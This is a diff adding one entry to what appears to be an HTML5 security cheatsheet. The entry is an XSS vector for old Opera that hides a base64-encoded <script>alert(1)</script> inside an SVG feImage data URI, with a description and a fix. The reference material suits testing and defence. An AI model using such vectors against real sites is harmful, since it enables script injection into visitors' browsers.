@@ -2965,5 +2965,34 @@ var items =
         },
         'tags'       : ['xss', 'svg', 'opera', 'XML-events'],
         'reporter'   : 'LeverOne'
+    },
+    { /* ID 95 - Using SVG element <feImage> and data URIs */
+        'id'         : 95,
+        'category'   : 'svg',
+        'name'       : {
+            'en' : 'Using SVG element <feImage> and data URIs',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\r\n<feImage xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D" />\r\n</svg>',        
+        'description': {
+            'en' : 'SVG allows using filter effects to be applied on arbitrary visible SVG elements. The feImage filter allows inclusion of other files - as well as data URIs. With a maliciuosly crafted data URI it\'s possible to execute JavaScript without user interaction.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : ['http://www.w3.org/TR/SVG/filters.html'],
+        'howtofix'   : {
+            'en' : 'Make sure that user submitted SVG data and SVG files are treated as XML documents - not as images. The nature of SVG allows to include almost arbitrary XML data including JavaScript leading to XSS or worse.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'browsers'   : {
+        'opera'  : ['10.x', '10.5', '10.6']
+        },
+        'tags'       : ['xss', 'svg', 'opera', 'filter effects', 'feimage'],
+        'reporter'   : '.mario'
     }
 ]
